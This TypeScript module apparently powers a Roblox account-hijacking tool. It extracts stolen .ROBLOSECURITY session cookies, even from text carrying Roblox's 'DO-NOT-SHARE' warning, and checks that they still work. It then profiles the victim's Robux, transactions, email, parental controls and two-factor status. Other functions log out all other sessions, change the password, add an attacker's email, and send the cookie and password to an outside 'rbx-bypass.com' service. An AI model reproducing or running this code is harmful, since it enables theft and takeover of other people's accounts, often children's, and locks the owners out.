import axios from 'axios';
import { CookieJar } from 'tough-cookie';
import { wrapper } from 'axios-cookiejar-support';
import { ENDPOINTS } from './endpoints';

const AXIOS_TIMEOUT = 25000;
const MAX_RETRIES = 3;
const RETRY_DELAY = 1000;

async function axiosWithRetry<T>(
  method: 'get' | 'post' | 'patch',
  url: string,
  options: any = {},
  retries = MAX_RETRIES
): Promise<T> {
  let lastError: any;
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const resp = await axios[method](url, {
        ...options,
        timeout: AXIOS_TIMEOUT,
        validateStatus: () => true,
      });
      return resp as T;
    } catch (err: any) {
      lastError = err;
      if (attempt < retries) {
        const delay = RETRY_DELAY * Math.pow(2, attempt) + Math.random() * 500;
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  throw lastError;
}

export function extractCookie(raw: string): string | null {
  const trimmed = raw.trim();
  const fullMatch = trimmed.match(/_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(CAEQ[A-Za-z0-9._\-+=\/]+)/);
  if (fullMatch) return fullMatch[1];
  const bareMatch = trimmed.match(/^CAEQ[A-Za-z0-9._\-+=\/]+$/);
  if (bareMatch) return bareMatch[0];
  const codeFenceMatch = trimmed.match(/```(?:[a-z]*\n)?([A-Za-z0-9._\-+=\/]+)```/);
  if (codeFenceMatch) return extractCookie(codeFenceMatch[1]);
  if (/^CAEQ[A-Za-z0-9._\-+=\/]{50,}$/.test(trimmed)) return trimmed;
  return null;
}

export async function validateCookie(cookie: string, maxAttempts = 4): Promise<{
  valid: boolean;
  userId?: number;
  username?: string;
  displayName?: string;
  debug: string;
  isNetworkError: boolean;
}> {
  const debugLines: string[] = [];
  const log = (msg: string) => debugLines.push(msg);

  const rawCookie = extractCookie(cookie);
  if (!rawCookie) {
    log('No valid cookie token found');
    return { valid: false, debug: debugLines.join('\n'), isNetworkError: false };
  }

  const trimmed = rawCookie.trim();

  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      const jar = new CookieJar();
      await jar.setCookie(`.ROBLOSECURITY=${trimmed}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
      const client = wrapper(axios.create({ jar }));

      const resp = await client.get(ENDPOINTS.USERS_AUTHENTICATED, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
        validateStatus: () => true,
        timeout: AXIOS_TIMEOUT,
      });

      log(`Attempt ${attempt}: status ${resp.status}`);
      if (resp.status === 200) {
        const data = resp.data;
        return {
          valid: true,
          userId: data.id,
          username: data.name,
          displayName: data.displayName,
          debug: debugLines.join('\n'),
          isNetworkError: false,
        };
      }
      if (resp.status === 401) {
        log('Cookie invalid (401)');
        return { valid: false, debug: debugLines.join('\n'), isNetworkError: false };
      }
      if (resp.status === 429 || resp.status === 530) {
        log(`Rate limited or Cloudflare error (${resp.status})`);
        if (attempt < maxAttempts) {
          const delay = Math.min(1000 * Math.pow(2, attempt), 10000) + Math.random() * 1000;
          log(`Waiting ${Math.round(delay)}ms before retry`);
          await new Promise(resolve => setTimeout(resolve, delay));
          continue;
        }
      }
    } catch (err: any) {
      log(`Attempt ${attempt} error: ${err.message}`);
      if (attempt === maxAttempts) {
        const isNetwork = err.message.includes('getaddrinfo') || err.message.includes('ENOTFOUND') || err.message.includes('ETIMEDOUT') || err.code === 'ECONNRESET';
        return { valid: false, debug: debugLines.join('\n'), isNetworkError: isNetwork };
      }
      const delay = Math.min(1000 * Math.pow(2, attempt), 8000) + Math.random() * 1000;
      log(`Waiting ${Math.round(delay)}ms before retry`);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }

  return {
    valid: false,
    debug: debugLines.join('\n'),
    isNetworkError: true,
  };
}

export async function refreshSession(cookie: string): Promise<{ success: boolean; newCookie: string | null; error?: string }> {
  try {
    const trimmed = cookie.trim();
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${trimmed}; Domain=.roblox.com; Path=/`, 'https://auth.roblox.com');
    const client = wrapper(axios.create({ jar }));

    const baseHeaders = {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    };

    const csrfResp = await client.post(ENDPOINTS.AUTH_LOGOUT, {}, {
      headers: baseHeaders,
      validateStatus: () => true,
      timeout: AXIOS_TIMEOUT,
    });
    const csrf = csrfResp.headers['x-csrf-token'] as string | undefined;
    if (!csrf) {
      return { success: false, newCookie: null, error: `CSRF missing (${csrfResp.status})` };
    }

    const refreshHeaders = { ...baseHeaders, 'X-CSRF-TOKEN': csrf };
    const refreshResp = await client.post(ENDPOINTS.AUTH_SESSION_REFRESH, {}, {
      headers: refreshHeaders,
      validateStatus: () => true,
      timeout: AXIOS_TIMEOUT,
    });
    if (refreshResp.status !== 200) {
      return { success: false, newCookie: null, error: `Refresh failed (${refreshResp.status})` };
    }

    const setCookie = refreshResp.headers['set-cookie'];
    let newCookie: string | null = null;
    if (setCookie) {
      const raw = Array.isArray(setCookie) ? setCookie.join(';') : setCookie;
      const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
      if (match) newCookie = match[1];
    }
    if (!newCookie) {
      return { success: false, newCookie: null, error: 'No new cookie in response' };
    }
    return { success: true, newCookie };
  } catch (err: any) {
    return { success: false, newCookie: null, error: err.message };
  }
}

export async function getUserAge(userId: number): Promise<number> {
  try {
    const resp = await axios.get(ENDPOINTS.USERS_USER(String(userId)), { timeout: AXIOS_TIMEOUT });
    const created = new Date(resp.data.created);
    const now = new Date();
    const diff = now.getTime() - created.getTime();
    return Math.floor(diff / (1000 * 3600 * 24));
  } catch {
    return -1;
  }
}

export async function fetchRobux(cookie: string, userId: string): Promise<number> {
  try {
    const resp = await axiosWithRetry<any>('get', ENDPOINTS.ECONOMY_CURRENCY(userId), {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200 && resp.data?.robux !== undefined) return resp.data.robux;
  } catch {}
  return 0;
}

export async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
  try {
    const resp = await fetch(ENDPOINTS.TRANSACTION_TOTALS(userId), {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as { incomingRobuxTotal: number; outgoingRobuxTotal: number };
      return { incoming: data.incomingRobuxTotal || 0, outgoing: data.outgoingRobuxTotal || 0 };
    }
  } catch {}
  return { incoming: 0, outgoing: 0 };
}

export async function fetchCountry(cookie: string, retries = 2): Promise<string> {
  for (let i = 0; i <= retries; i++) {
    try {
      const resp = await fetch(ENDPOINTS.ACCOUNT_COUNTRY, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      });
      if (resp.status === 200) {
        const data = (await resp.json()) as { value: { countryName: string } };
        return data.value?.countryName || 'Unknown';
      }
    } catch {}
    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
  }
  return 'Unknown';
}

export async function fetchEmailInfo(cookie: string, retries = 2): Promise<{ verified: string | null; pending: string | null }> {
  for (let i = 0; i <= retries; i++) {
    try {
      const resp = await fetch(ENDPOINTS.ACCOUNT_EMAIL, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      });
      if (resp.status === 200) {
        const data = (await resp.json()) as { emailAddress: string; verified: boolean; canBypassPasswordForEmailUpdate: boolean };
        return { verified: data.verified ? data.emailAddress : null, pending: null };
      }
    } catch {}
    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
  }
  return { verified: null, pending: null };
}

export async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
  try {
    const resp = await fetch(ENDPOINTS.PARENTAL_CONTROLS, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as { parents: unknown[]; canAddParent: boolean };
      return { hasParent: (data.parents && data.parents.length > 0) || false };
    }
  } catch {}
  return { hasParent: false };
}

export async function fetchAvatarThumbnail(userId: string): Promise<string | null> {
  try {
    const resp = await fetch(ENDPOINTS.AVATAR_THUMBNAIL(userId), {
      headers: { 'User-Agent': 'Mozilla/5.0' },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as { data: { imageUrl: string }[] };
      if (data.data && data.data.length > 0 && data.data[0].imageUrl) {
        return data.data[0].imageUrl;
      }
    }
  } catch {}
  return null;
}

export async function killAndRefreshSession(cookie: string): Promise<{ success: boolean; newCookie: string | null; error?: string }> {
  try {
    const cleanCookie = cookie.trim();
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${cleanCookie}; Domain=.roblox.com; Path=/`, 'https://roblox.com');
    const client = wrapper(axios.create({ jar }));
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Origin': 'https://www.roblox.com',
      'Referer': 'https://www.roblox.com/',
    };

    let newCookie: string | null = null;
    let authResp;

    for (let attempt = 0; attempt < 3; attempt++) {
      authResp = await client.post(ENDPOINTS.AUTH_LOGOUT_ALL, {}, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
      if (authResp.status === 403) {
        const csrf = authResp.headers['x-csrf-token'];
        if (csrf) {
          headers['X-CSRF-TOKEN'] = csrf;
          authResp = await client.post(ENDPOINTS.AUTH_LOGOUT_ALL, {}, { headers, validateStatus: () => true, timeout: AXIOS_TIMEOUT });
        }
      }
      if (authResp.status === 200) {
        const cookies = jar.getCookiesSync('https://roblox.com');
        const c = cookies.find(c => c.key === '.ROBLOSECURITY');
        if (c) newCookie = decodeURIComponent(c.value);
        if (!newCookie && authResp.headers['set-cookie']) {
          const raw = Array.isArray(authResp.headers['set-cookie'])
            ? authResp.headers['set-cookie'].join(';')
            : authResp.headers['set-cookie'];
          const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
          if (match) newCookie = match[1];
        }
        if (newCookie) break;
      }
      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (!newCookie || authResp?.status !== 200) {
      return { success: false, newCookie: null, error: `Reset failed with status ${authResp?.status}` };
    }
    return { success: true, newCookie };
  } catch (err: any) {
    return { success: false, newCookie: null, error: err.message };
  }
}

export async function checkTwoFactorStatus(cookie: string, userId: string): Promise<{ enabled: boolean; mediaType: string | null }> {
  try {
    const resp = await fetch(ENDPOINTS.USER_CONFIGURATION(userId), {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as { primaryMediaType: string; methods: { mediaType: string; enabled: boolean }[] };
      const authMethod = data.methods.find(m => m.mediaType === 'Authenticator');
      return {
        enabled: authMethod ? authMethod.enabled : false,
        mediaType: data.primaryMediaType || null,
      };
    }
  } catch {}
  return { enabled: false, mediaType: null };
}

export async function addPendingEmail(cookie: string, newEmail: string, password: string): Promise<{ success: boolean; error?: string }> {
  try {
    const session = await (async () => {
      const jar = new CookieJar();
      await jar.setCookie(`.ROBLOSECURITY=${cookie.trim()}; Domain=.roblox.com; Path=/`, 'https://accountsettings.roblox.com');
      return wrapper(axios.create({ jar }));
    })();

    const baseHeaders = {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    };

    let resp = await session.post(ENDPOINTS.ACCOUNT_EMAIL, { email: newEmail, password }, {
      headers: baseHeaders,
      validateStatus: () => true,
      timeout: AXIOS_TIMEOUT,
    });

    if (resp.status === 403 && resp.headers['x-csrf-token']) {
      const csrf = resp.headers['x-csrf-token'];
      resp = await session.post(ENDPOINTS.ACCOUNT_EMAIL, { email: newEmail, password }, {
        headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf },
        validateStatus: () => true,
        timeout: AXIOS_TIMEOUT,
      });
    }

    if (resp.status === 200) {
      return { success: true };
    }

    let errorMsg = `HTTP ${resp.status}`;
    try {
      const json = resp.data;
      if (json && json.message) errorMsg = json.message;
    } catch {}
    return { success: false, error: errorMsg };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

export async function changePassword(
  cookie: string,
  currentPassword: string,
  newPassword: string
): Promise<{ success: boolean; error?: string }> {
  try {
    const session = await (async () => {
      const jar = new CookieJar();
      await jar.setCookie(`.ROBLOSECURITY=${cookie.trim()}; Domain=.roblox.com; Path=/`, 'https://auth.roblox.com');
      return wrapper(axios.create({ jar }));
    })();

    const baseHeaders = {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    };

    let resp = await session.post(ENDPOINTS.AUTH_PASSWORD_CHANGE, { currentPassword, newPassword }, {
      headers: baseHeaders,
      validateStatus: () => true,
      timeout: AXIOS_TIMEOUT,
    });

    if (resp.status === 403 && resp.headers['x-csrf-token']) {
      const csrf = resp.headers['x-csrf-token'];
      resp = await session.post(ENDPOINTS.AUTH_PASSWORD_CHANGE, { currentPassword, newPassword }, {
        headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf },
        validateStatus: () => true,
        timeout: AXIOS_TIMEOUT,
      });
    }

    if (resp.status === 200) {
      return { success: true };
    }

    let errorMsg = `HTTP ${resp.status}`;
    try {
      const json = resp.data;
      if (json && json.message) errorMsg = json.message;
    } catch {}
    return { success: false, error: errorMsg };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

export async function bypassAgeVerification(cookie: string, password: string): Promise<{
  success: boolean;
  message: string;
  newCookie?: string;
  inProgress?: boolean;
}> {
  try {
    const resp = await axios.post(
      ENDPOINTS.BYPASS_API,
      { cookie, password },
      {
        headers: {
          'authority': 'rbx-bypass.com',
          'accept': '*/*',
          'content-type': 'application/json',
          'origin': 'https://rbx-bypass.com',
          'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        },
        timeout: AXIOS_TIMEOUT,
        validateStatus: () => true,
      }
    );

    if (typeof resp.data === 'string' && resp.data.trim() === 'Loading...') {
      return { success: false, message: 'Loading...', inProgress: true };
    }

    if (typeof resp.data === 'object' && resp.data !== null) {
      const data = resp.data;
      if (data.success === true) {
        return { success: true, message: data.message || 'Success', newCookie: data.cookie || undefined };
      }
      if (data.error === 'BYPASS_IN_PROGRESS') {
        return { success: false, message: 'Progressing..', inProgress: true };
      }
      return { success: false, message: data.message || data.error || 'Unknown error' };
    }

    return { success: false, message: `Unexpected response: ${resp.data}` };
  } catch (err: any) {
    if (err.code === 'ECONNABORTED' || err.message?.includes('timeout')) {
      return { success: false, message: 'Progressing..', inProgress: true };
    }
    if (err.code === 'ECONNRESET' || err.message?.includes('socket disconnected')) {
      return { success: false, message: 'Network error, please retry.' };
    }
    return { success: false, message: err.message || 'Unknown error' };
  }
}